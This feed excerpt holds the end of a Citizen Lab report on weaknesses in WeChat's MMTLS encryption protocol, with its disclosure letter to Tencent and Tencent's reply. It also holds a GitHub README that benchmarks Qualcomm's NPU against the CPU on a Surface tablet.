<h3 id="to-high-risk-users-with-privacy-concerns">To high-risk users with privacy concerns</h3>
<p>Many WeChat users use it out of necessity rather than choice. For users with privacy concerns who are using WeChat out of necessity, our recommendations from <a href="https://citizenlab.ca/2023/06/privacy-in-the-wechat-ecosystem-full-report/"><u>the previous report</u></a> still hold:</p>
<ul>
<li>Avoid features delineated as “Weixin” services if possible. We note that many core “Weixin” services (such as Search, Channels, Mini Programs) as delineated by the Privacy Policy perform more tracking than core “WeChat” services.</li>
<li>When possible, prefer web or applications over Mini Programs or other such embedded functionality.</li>
<li>Use stricter device permissions and update your software and OS regularly for security features.</li>
</ul>
<p>In addition, due to the risks introduced by dynamic code loading in WeChat downloaded from the official website, we recommend users to instead download WeChat from the Google Play Store whenever possible. For users who have already installed WeChat from the official website, removing and re-installing the Google Play Store version would also mitigate the risk.</p>
<h3 id="to-security-and-privacy-researchers">To security and privacy researchers</h3>
<p>As WeChat has over one billion users, we posit that the order of magnitude of global MMTLS users is on a similar order of magnitude as global TLS users. Despite this, there is little-to-no third-party analysis or scrutiny of MMTLS, as there is in TLS. At this scale of influence, MMTLS deserves similar scrutiny as TLS. We implore future security and privacy researchers to build on this work to continue the study of the MMTLS protocol, as from our correspondences, Tencent insists on continuing to use and develop MMTLS for WeChat connections.</p>
<h2><span>Acknowledgments</span></h2>
<p><span>We would like to thank Jedidiah Crandall, Jakub Dalek, Prateek Mittal, and Jonathan Mayer for their guidance and feedback on this report. Research for this project was supervised by Ron Deibert.</span></p>
<h2 id="appendix">Appendix</h2>
<p>In this appendix, we detail our disclosure to Tencent concerning our findings and their response.</p>
<h2 id="april-24-2024-our-disclosure">April 24, 2024 — Our disclosure</h2>
<p>To Whom It May Concern:</p>
<p>The Citizen Lab is an academic research group based at the Munk School of Global Affairs &amp; Public Policy at the University of Toronto in Toronto, Canada.</p>
<p>We analyzed WeChat v8.0.23 on Android and iOS as part of our ongoing work analyzing popular mobile and desktop apps for security and privacy issues. We found that WeChat’s proprietary network encryption protocol, MMTLS, contains weaknesses compared to modern network encryption protocols, such as TLS or QUIC+TLS. For instance, the protocol is not forward-secret and may be susceptible to replay attacks. We plan on publishing a documentation of the MMTLS network encryption protocol and strongly suggest that WeChat, which is responsible for the network security of over 1 billion users, switch to a strong and performant encryption protocol like TLS or QUIC+TLS.</p>
<p>For further details, please see the <a href="https://citizenlab.ca/wp-content/uploads/2024/10/CL-Disclosure-042424.docx"><strong>attached document</strong></a>.</p>
<p><strong>Timeline to Public Disclosure</strong></p>
<p>The Citizen Lab is committed to research transparency and will publish details regarding the security vulnerabilities it discovers in the context of its research activities, absent exceptional circumstances, on its website: https://citizenlab.ca/.</p>
<p>The Citizen Lab will publish the details of our analysis no sooner than 45 calendar days from the date of this communication.</p>
<p>Should you have any questions about our findings please let us know. We can be reached at this email address: <a href="https://citizenlab.ca/cdn-cgi/l/email-protection" data-cfemail="7e1a170d1d12110d0b0c1b3e1d170a121f1c500b0a110c11100a11501d1f">[email&nbsp;protected]</a>.</p>
<p>Sincerely,</p>
<p>The Citizen Lab</p>
<h2 id="may-17-2024-tencents-response">May 17, 2024 — Tencent’s response</h2>
<p>Thank you for your report.Since receiving your report on April 25th, 2024, we have conducted a careful evaluation.The core of WeChat’s security protocol is outer layer mmtls encryption, currently ensuring that outer layer mmtls encryption is secure. On the other hand, the encryption issues in the inner layer are handled as follows: the core data traffic has been switched to AES-GCM encryption, while other traffic is gradually switching from AES-CBC to AES-GCM.If you have any other questions, please let us know.thanks.</p>
<section id="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn1">The terms “shortlink” and “longlink” do not seem to be specific to WeChat, since it was also mentioned in <a href="http://www.52im.net/thread-3908-1-1.html" target="_blank" rel="noopener"><u>other technical blogs</u></a>.<a role="doc-backlink" href="#fnref1">↩︎</a></li>
<li id="fn2">On Android, the main process is named after the app ID, “com.tencent.mm”. (The process name can be seen using the ps command in adb shell.) When an app starts a new process, it assigns a name. The assigned name will be added to the app ID to form the full name of the new process. So the “:push” process’s full name is “com.tencent.mm:push”.<a role="doc-backlink" href="#fnref2">↩︎</a></li>
<li id="fn3">This server heartbeat is a reply to a prior client-sent heartbeat.<a role="doc-backlink" href="#fnref3">↩︎</a></li>
</ol>
</section>

                </section>
                                 
              </article> 
						
												

			</section>
		</main>
			 </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AI PCs Aren't Good at AI: The CPU Beats the NPU (461 pts)]]></title>
            <link>https://github.com/usefulsensors/qc_npu_benchmark</link>
            <guid>41863061</guid>
            <pubDate>Wed, 16 Oct 2024 19:44:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/usefulsensors/qc_npu_benchmark">https://github.com/usefulsensors/qc_npu_benchmark</a>, See on <a href="https://news.ycombinator.com/item?id=41863061">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Benchmarking Qualcomm's NPU on the Microsoft Surface Tablet</h2><a id="user-content-benchmarking-qualcomms-npu-on-the-microsoft-surface-tablet" aria-label="Permalink: Benchmarking Qualcomm's NPU on the Microsoft Surface Tablet" href="#benchmarking-qualcomms-npu-on-the-microsoft-surface-tablet"></a></p>
<p dir="auto">TL;DR - We see 1.3% of Qualcomm's NPU 45 Teraops/s claim when benchmarking Windows AI PCs</p>
<ul dir="auto">
<li><a href="#introduction">Introduction</a></li>
<li><a href="#installation">Installation</a>
<ul dir="auto">
<li><a href="#python">Python</a></li>
<li><a href="#cmake">Cmake</a></li>
<li><a href="#visual-studio">Visual Studio</a></li>
<li><a href="#pip-packages">Pip Packages</a></li>
</ul>
</li>
<li><a href="#benchmark">Benchmark</a>
<ul dir="auto">
<li><a href="#running">Running</a></li>
<li><a href="#understanding-the-output">Understanding the Output</a></li>
<li><a href="#what-the-benchmark-measures">What the Benchmark Measures</a></li>
<li><a href="#possible-confounding-factors">Possible Confounding Factors</a>
<ul dir="auto">
<li><a href="#compute-bound">Compute Bound</a></li>
<li><a href="#power-settings">Power Settings</a></li>
<li><a href="#model-topology">Model Topology</a></li>
<li><a href="#configuration-errors">Configuration Errors</a></li>
<li><a href="#onnx-framework">Onnx Framework</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#interpreting-the-results">Interpreting the Results</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Introduction</h2><a id="user-content-introduction" aria-label="Permalink: Introduction" href="#introduction"></a></p>
<p dir="auto">Microsoft now offers Surface tablets that run Windows on a Qualcomm Arm-based
SoC. These are marketed as AI PCs, due to their ability to run machine learning
models faster and more efficiently than other systems. We are fans of
Qualcomm's hardware, and its NPU in particular, so we've invested a lot of time
and resources into porting our third-party app to this plaform.</p>
<p dir="auto">Unfortunately there  aren't many code examples or benchmarks available to
demonstrate how to achieve fast results as an external developer, so we've put
together a small standalone project to show the performance we're seeing. It's
significantly below what we'd hoped for, so we're publishing this benchmark to
see if we can get ideas on how to achieve lower latency. I'm hopeful there will
be software changes, either at the application, framework, or driver level,
that will improve these results in the future, since I've seen the underlying
hardware perform very effectively on other platforms like Android.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Python</h3><a id="user-content-python" aria-label="Permalink: Python" href="#python"></a></p>
<p dir="auto">We're using Python to run our test scripts, and on Windows <a href="https://docs.python.org/3/using/windows.html" rel="nofollow">there are several ways to install the language</a>.
As of October 2nd, 2024, the Python available on the Microsoft Store doesn't
support the Arm architecture, and so it's not suitable for running the packages
we need to access Qualcomm's NPU. Instead, you should use <a href="https://www.python.org/downloads/" rel="nofollow">the official Python dot org installer</a>.
For the results reported here I used <a href="https://www.python.org/ftp/python/3.11.9/python-3.11.9-arm64.exe" rel="nofollow">version 3.11.9</a>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Cmake</h3><a id="user-content-cmake" aria-label="Permalink: Cmake" href="#cmake"></a></p>
<p dir="auto">We'll also need the cmake build tool to compile Onnx (since prebuilt packages
aren't yet available for Windows on Arm). To do this I ran the following
command from a Powershell:</p>

<p dir="auto"><h3 tabindex="-1" dir="auto">Visual Studio</h3><a id="user-content-visual-studio" aria-label="Permalink: Visual Studio" href="#visual-studio"></a></p>
<p dir="auto">The build process also requires Visual Studio for the compiler. Download Visual
Studio Community Edition (not Code!) from <a href="https://visualstudio.microsoft.com/downloads/" rel="nofollow">visualstudio.microsoft.com/downloads/</a>.</p>
<p dir="auto">During the installation you will be prompted to select <code>Workload</code> from several options: select <code>Desktop C++ Development</code> checkbox then press install.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Pip Packages</h3><a id="user-content-pip-packages" aria-label="Permalink: Pip Packages" href="#pip-packages"></a></p>
<p dir="auto">You can install all the required Python packages by running the following
from within this folder:</p>
<div data-snippet-clipboard-copy-content="py -m pip install -r requirements.txt"><pre><code>py -m pip install -r requirements.txt
</code></pre></div>
<p dir="auto">This includes a couple of custom packages. The first is <a href="https://github.com/petewarden/onnx/tree/rel-1.16.2">my branch of Onnx</a>,
which has <a href="https://github.com/onnx/onnx/pull/6407" data-hovercard-type="pull_request" data-hovercard-url="/onnx/onnx/pull/6407/hovercard">a fix for compiling using the official <code>py</code> launcher</a>
backported to Onnx version 1.16, since the Qualcomm Onnx Runtime doesn't work
with newer Onnx versions (giving an <code>Unsupported model IR version</code> error).</p>
<p dir="auto">I also grab <a href="https://aiinfra.pkgs.visualstudio.com/2692857e-05ef-43b4-ba9c-ccf1c22c437c/_packaging/7982ae20-ed19-4a35-a362-a96ac99897b7/pypi/download/ort-nightly-qnn/1.20.dev20240928001/ort_nightly_qnn-1.20.0.dev20240928001-cp311-cp311-win_arm64.whl#sha256=3b12e3882d1afadf66c2349b2a167dfcbb9ae7a332dc98e0fd51c101d34ddf6e" rel="nofollow">a nightly build</a>
of <a href="https://onnxruntime.ai/docs/execution-providers/QNN-ExecutionProvider.html" rel="nofollow">Qualcomm's Onnx Runtime package</a>.
If you want to install a more recent version, there's <a href="https://aiinfra.pkgs.visualstudio.com/PublicPackages/_packaging/ORT-Nightly/pypi/simple/ort-nightly-qnn/" rel="nofollow">a list here</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Benchmark</h2><a id="user-content-benchmark" aria-label="Permalink: Benchmark" href="#benchmark"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Running</h3><a id="user-content-running" aria-label="Permalink: Running" href="#running"></a></p>
<p dir="auto">To execute the benchmark, run:</p>

<p dir="auto"><h3 tabindex="-1" dir="auto">Understanding the Output</h3><a id="user-content-understanding-the-output" aria-label="Permalink: Understanding the Output" href="#understanding-the-output"></a></p>
<p dir="auto">The Onnx runtime initially generates a lot of log spam, including:</p>
<div data-snippet-clipboard-copy-content="Error in cpuinfo: Unknown chip model name 'Snapdragon(R) X 12-core X1E80100 @ 3.40 GHz'.
Please add new Windows on Arm SoC/chip support to arm/windows/init.c!
unknown Qualcomm CPU part 0x1 ignored"><pre><code>Error in cpuinfo: Unknown chip model name 'Snapdragon(R) X 12-core X1E80100 @ 3.40 GHz'.
Please add new Windows on Arm SoC/chip support to arm/windows/init.c!
unknown Qualcomm CPU part 0x1 ignored
</code></pre></div>
<p dir="auto">and</p>
<div data-snippet-clipboard-copy-content="Starting stage: Finalizing Graph Sequence
Completed stage: Finalizing Graph Sequence (115919 us)
Starting stage: Completion
Completed stage: Completion (1025 us)"><pre><code>Starting stage: Finalizing Graph Sequence
Completed stage: Finalizing Graph Sequence (115919 us)
Starting stage: Completion
Completed stage: Completion (1025 us)
</code></pre></div>
<p dir="auto">After all those messages, you should see the actual benchmark
results at the end, something like this:</p>
<div dir="auto" data-snippet-clipboard-copy-content="************ Benchmark Results ************
NPU quantized compute, float I/O accuracy difference is 0.0100
NPU quantized compute and I/O accuracy difference is 0.0060
CPU took 8.42ms, 821,141,860,688 ops per second
NPU (quantized compute, float I/O) took 30.63ms, 225,667,671,183 ops per second
NPU (quantized compute and I/O) took 12.05ms, 573,475,650,364 ops per second"><pre><span>************</span> Benchmark Results <span>************</span>
NPU quantized compute, float I/O accuracy difference is 0.0100
NPU quantized compute and I/O accuracy difference is 0.0060
CPU took 8.42ms, 821,141,860,688 ops per second
NPU (quantized compute, float I/O) took 30.63ms, 225,667,671,183 ops per second
NPU (quantized compute and I/O) took 12.05ms, 573,475,650,364 ops per second</pre></div>
<p dir="auto">The first two lines confirm that the numerical results of the operations match
between the CPU and the NPU. The final three show the latency of the three
approaches to running a simple model. The latency is the wall time it took to
execute the model from start to finish, and the ops per second is calculated
from that latency to indicate the equivalent computational throughput.</p>
<p dir="auto">In this example, we see the CPU is capable of running 821 billion ops/second
(821 Gigaops), the first NPU approach gives us 225 Gigaops, and the second 573
Gigaops.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">What the Benchmark Measures</h3><a id="user-content-what-the-benchmark-measures" aria-label="Permalink: What the Benchmark Measures" href="#what-the-benchmark-measures"></a></p>
<p dir="auto">This benchmark is designed to resemble some real world models we depend on,
running 6 large matrix multiplications that are similar to the most
time-consuming layers in transformer models like OpenAI's Whisper. The shapes
are (6, 1500, 256) X (6, 256, 1500), producing a (6, 1500, 1500) result. The
model we running consists of a single MatMul node with two inputs and one
output.</p>
<p dir="auto">The models are created on the fly using the Onnx model framework, and then fed
into the Onnx runtime. The control model is a pure float version that runs
entirely on the CPU.</p>
<p dir="auto">The NPU mostly requires quantized models to run effectively (though it has
limited support for float16). The first approach we took to quantization used
<a href="https://onnxruntime.ai/docs/performance/model-optimizations/quantization.html#static-quantization" rel="nofollow">the official ORT <code>quantize_static()</code> method</a>.
For convenience this leaves the input and output tensors in 32-bit float and
performs runtime conversions at the start and end of the graph so that the rest
of the computation happens in eight-bit.</p>
<p dir="auto">Unfortunately we discovered that the conversion operations as implemented on
the NPU were extremely slow, much slower than the main matrix multiplication
in fact. You can see the results in the <code>npu_quant_profile.csv</code> file in this
repository, with conversions taking over 75% of the time.</p>
<p dir="auto">To work around this, we constructed an equivalent model graph programmatically
with eight-bit inputs and outputs This is the second "quantized compute and
I/O" approach mentioned in the results. This is usually around three times
faster than the float I/O version, and profiling shows most of the time is
going on the matrix multiplication, as we'd hope.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Possible Confounding Factors</h3><a id="user-content-possible-confounding-factors" aria-label="Permalink: Possible Confounding Factors" href="#possible-confounding-factors"></a></p>
<p dir="auto">There are a lot of variables involved in measuring performance. Here are some
of the assumptions we've made:</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Compute Bound</h4><a id="user-content-compute-bound" aria-label="Permalink: Compute Bound" href="#compute-bound"></a></p>
<p dir="auto">Modern transformer models are based around large matrix multiplications, unlike
older convolutional models. One potential issue is that accelerators could
become memory bound if the layers start to resemble matrix times vectors, since
that doesn't allow reuse of many of the weights, and performance becomes bottle
necked on fetching values from DRAM. We've tried to avoid that by making both
the input matrices more square, so that tiling and reuse should be possible.</p>
<p dir="auto">The original matrices from the tiny Whisper model had a k dimension of only 64,
so in case that was too small we bumped it up to 256 in this benchmark to give
as much room for SIMD optimizations as possible.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Power Settings</h4><a id="user-content-power-settings" aria-label="Permalink: Power Settings" href="#power-settings"></a></p>
<p dir="auto">Windows has a lot of different configuration options around energy usage, so we
tried to ensure that all of the settings were on "Best Performance" and that we
ran the benchmark with the tablet connected to mains power. There's also a
session option on the Qualcomm Onnx Runtime, <code>htp_performance_mode</code>, that we
set to <code>sustained_high_performance</code>, since that seemed to give the lowest
overall latency in our experiments.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Model Topology</h4><a id="user-content-model-topology" aria-label="Permalink: Model Topology" href="#model-topology"></a></p>
<p dir="auto">We wanted to create a graph of operations that reflected modern AI models, but
was simple enough to easily interpret. We could have added multiple layers, or
used convolutions, or static weights, but settled for a single matrix
multiplication operation with dynamic inputs, since that reflected the
transformer architectures that are widely used for LLMs and other modern
models.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Configuration Errors</h4><a id="user-content-configuration-errors" aria-label="Permalink: Configuration Errors" href="#configuration-errors"></a></p>
<p dir="auto">It's possible that the way we build and run our models causes them to fall off
the fast path of the drivers or accelerator implementation. For example, we're
using unsigned eight-bit quantization, with qdq elements in the graph. We've
attempted to follow best practice from the documentation, but we'd welcome ways
to improve performance, especially since these would improve the performance of
our actual applications.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Onnx Framework</h4><a id="user-content-onnx-framework" aria-label="Permalink: Onnx Framework" href="#onnx-framework"></a></p>
<p dir="auto">There are multiple different ways to access AI acceleration on Windows. We
looked at DirectML, but it only seems to support GPU access. OpenVino doesn't
run on our Arm hardware, as far as we can tell. We've seen similar performance
results to those shown here using the <a href="https://www.qualcomm.com/developer/software/neural-processing-sdk-for-ai" rel="nofollow">Qualcomm QNN SDK</a>
directly. TensorFlow Lite isn't supported on Windows for Arm. From this
research and our experiments, Onnx is supported by both Microsoft and Qualcomm,
and seems to be the best framework to use to get accelerated performance from
the NPU, but we're interested in learning if other APIs would be more
appropriate.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Interpreting the Results</h2><a id="user-content-interpreting-the-results" aria-label="Permalink: Interpreting the Results" href="#interpreting-the-results"></a></p>
<p dir="auto">The results shown here are current as of October 2nd, 2024, when running on a
Microsoft Surface Pro 11th Edition, with a Snapdragon(R) X 12-core X1E80100
clocked at 3.40 GHz. The first obvious thing is that the NPU results, even
without float conversion, are slower than the CPU. This is not ideal for an
accelerator, even though it could still potentially offer energy or sustained
performance advantages that make it worth using.</p>
<p dir="auto">The second conclusion is that the measured performance of 573 billion
operations per second is only 1.3% of the 45 trillion ops/s that <a href="https://www.microsoft.com/en-us/surface/devices/surface-pro-11th-edition" rel="nofollow">the marketing material</a>
promises.</p>
<p dir="auto">By contrast, running the same model on an Nvidia Geforce RTX 4080 Laptop GPU
runs in 3.2ms, an equivalent of 2,160 billion operations per second, almost
four times the throughput.</p>
</article></div></div>]]></description>
        </item>
    </channel>
</rss>